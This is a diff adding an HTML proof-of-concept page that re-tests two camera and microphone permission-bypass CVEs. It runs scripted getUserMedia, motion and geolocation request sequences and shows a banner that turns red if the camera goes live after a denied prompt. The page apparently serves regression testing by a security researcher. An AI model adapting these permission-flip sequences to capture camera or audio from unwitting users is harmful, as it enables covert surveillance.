@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC 01 - Camera/Mic Permission State Machine</title>
+<style>
+  body{font-family:-apple-system,Helvetica,Arial,sans-serif;margin:0;padding:12px;background:#f2f2f7;color:#111}
+  h1{font-size:17px;margin:0 0 4px}
+  .sub{font-size:12px;color:#666;margin:0 0 10px}
+  .oracle{font-weight:700;font-size:15px;padding:12px;border-radius:10px;text-align:center;margin-bottom:10px}
+  .live{background:#ff3b30;color:#fff}
+  .idle{background:#34c759;color:#fff}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
+  button{padding:12px 8px;font-size:13px;border:none;border-radius:9px;background:#007aff;color:#fff}
+  button.warn{background:#ff9500}
+  button.stop{background:#8e8e93}
+  button.seq{background:#5856d6;grid-column:1/3}
+  #log{background:#000;color:#0f0;font-family:ui-monospace,Menlo,monospace;font-size:11px;padding:8px;border-radius:8px;height:220px;overflow:auto;white-space:pre-wrap}
+  .row{display:flex;gap:8px;margin-top:8px}
+  .row button{flex:1;background:#333}
+  video{width:1px;height:1px;position:absolute;left:-9999px}
+</style>
+</head>
+<body>
+<h1>PoC 01 — Camera/Mic Permission State Machine</h1>
+<p class="sub">Re-test of CVE-2025-31192 &amp; CVE-2025-43356. Oracle = the banner. If it ever turns RED (CAMERA LIVE) after you DENIED camera in a prompt, that is a bypass. Record screen + film the phone with a 2nd camera.</p>
+
+<div id="oracle" class="oracle idle">CAMERA IDLE</div>
+
+<div class="grid">
+  <button onclick="reqVideo()">1. Request VIDEO</button>
+  <button onclick="reqAudio()">2. Request AUDIO</button>
+  <button onclick="reqBoth()">3. Request VIDEO+AUDIO</button>
+  <button class="warn" onclick="reqVideoEnv()">4. Request VIDEO {env}</button>
+  <button class="warn" onclick="reqVideoConstraint()">5. VIDEO exact deviceId</button>
+  <button onclick="reqMotion()">6. Request DeviceMotion</button>
+  <button onclick="reqGeo()">7. Request Geolocation</button>
+  <button onclick="enumerate()">8. enumerateDevices()</button>
+  <button class="stop" onclick="stopAll()">Stop ALL tracks</button>
+  <button class="stop" onclick="checkPerms()">Query permissions</button>
+
+  <button class="seq" onclick="seqClassic()">▶ Sequence A: classic 31192 (deny video → allow audio)</button>
+  <button class="seq" onclick="seqRepause()">▶ Sequence B: 43356 re-click after deny</button>
+  <button class="seq" onclick="seqCrossPerm()">▶ Sequence C: deny video → allow motion/geo → re-request video</button>
+  <button class="seq" onclick="seqConstraintFlip()">▶ Sequence D: deny plain video → request env/exact video</button>
+</div>
+
+<div id="log"></div>
+<div class="row">
+  <button onclick="copyLog()">Copy log</button>
+  <button onclick="document.getElementById('log').textContent=''">Clear log</button>
+</div>
+<video id="v" autoplay playsinline muted></video>
+
+<script>
+const logEl=document.getElementById('log');
+const oracle=document.getElementById('oracle');
+let tracks=[]; // all tracks we ever obtained
+function ts(){return new Date().toISOString().substr(11,12)}
+function log(m){logEl.textContent+=`[${ts()}] ${m}\n`;logEl.scrollTop=logEl.scrollHeight}
+function copyLog(){navigator.clipboard.writeText(logEl.textContent).then(()=>log('log copied'))}
+
+function register(stream,label){
+  stream.getTracks().forEach(t=>{
+    tracks.push(t);
+    log(`  + ${label} ${t.kind} track id=${t.id.substr(0,6)} state=${t.readyState}`);
+    t.onended=()=>log(`  - ${t.kind} track ${t.id.substr(0,6)} ended`);
+  });
+  document.getElementById('v').srcObject=stream;
+}
+async function gum(constraints,label){
+  log(`getUserMedia(${JSON.stringify(constraints)}) [${label}]`);
+  try{const s=await navigator.mediaDevices.getUserMedia(constraints);log(`  GRANTED ${label}`);register(s,label);return s;}
+  catch(e){log(`  DENIED/err ${label}: ${e.name} ${e.message}`);return null;}
+}
+const reqVideo=()=>gum({video:true},'video');
+const reqAudio=()=>gum({audio:true},'audio');
+const reqBoth=()=>gum({video:true,audio:true},'video+audio');
+const reqVideoEnv=()=>gum({video:{facingMode:{ideal:'environment'}}},'video-env');
+async function reqVideoConstraint(){
+  const devs=await navigator.mediaDevices.enumerateDevices();
+  const cam=devs.find(d=>d.kind==='videoinput');
+  if(!cam){log('no videoinput deviceId visible (perm not granted yet)');return}
+  gum({video:{deviceId:{exact:cam.deviceId}}},'video-exact');
+}
+function reqMotion(){
+  if(typeof DeviceMotionEvent?.requestPermission==='function'){
+    log('DeviceMotionEvent.requestPermission()');
+    DeviceMotionEvent.requestPermission().then(r=>log('  motion => '+r)).catch(e=>log('  motion err '+e));
+  }else log('DeviceMotion.requestPermission not available');
+}
+function reqGeo(){
+  log('geolocation.getCurrentPosition()');
+  navigator.geolocation.getCurrentPosition(
+    p=>log(`  geo GRANTED ${p.coords.latitude.toFixed(3)},${p.coords.longitude.toFixed(3)}`),
+    e=>log('  geo err '+e.code+' '+e.message));
+}
+async function enumerate(){
+  const d=await navigator.mediaDevices.enumerateDevices();
+  log('enumerateDevices: '+d.map(x=>x.kind+(x.label?'*':'')).join(', '));
+}
+function stopAll(){tracks.forEach(t=>t.stop());log('stopped '+tracks.length+' tracks');tracks=[]}
+async function checkPerms(){
+  for(const n of ['camera','microphone','geolocation']){
+    try{const s=await navigator.permissions.query({name:n});log(`perm ${n} = ${s.state}`)}catch(e){log(`perm ${n} unsupported`)}
+  }
+}
+
+// live oracle: is any video track live?
+setInterval(()=>{
+  const liveVideo=tracks.some(t=>t.kind==='video'&&t.readyState==='live');
+  if(liveVideo){oracle.className='oracle live';oracle.textContent='⚠ CAMERA LIVE'}
+  else{oracle.className='oracle idle';oracle.textContent='CAMERA IDLE'}
+},400);
+
+const wait=ms=>new Promise(r=>setTimeout(r,ms));
+async function seqClassic(){log('=== SEQ A: classic 31192 ===');log('STEP: deny the coming VIDEO prompt');await reqVideo();await wait(500);log('STEP: allow the coming AUDIO prompt');await reqAudio();log('Watch oracle — did camera reactivate?')}
+async function seqRepause(){log('=== SEQ B: 43356 re-click ===');await reqVideo();await wait(500);await reqAudio();await wait(500);log('STEP: re-request VIDEO explicitly (43356 primitive)');await reqVideo()}
+async function seqCrossPerm(){log('=== SEQ C: cross-permission flip ===');log('STEP: deny VIDEO');await reqVideo();await wait(500);log('STEP: allow DeviceMotion');reqMotion();await wait(1500);log('STEP: allow Geolocation');reqGeo();await wait(1500);log('STEP: re-request VIDEO');await reqVideo()}
+async function seqConstraintFlip(){log('=== SEQ D: constraint flip ===');log('STEP: deny plain VIDEO');await reqVideo();await wait(500);log('STEP: request env-facing VIDEO (different constraint)');await reqVideoEnv();await wait(500);log('STEP: request exact-deviceId VIDEO');await reqVideoConstraint()}
+log('ready. secure context = '+window.isSecureContext);
+</script>
+</body>
+</html>
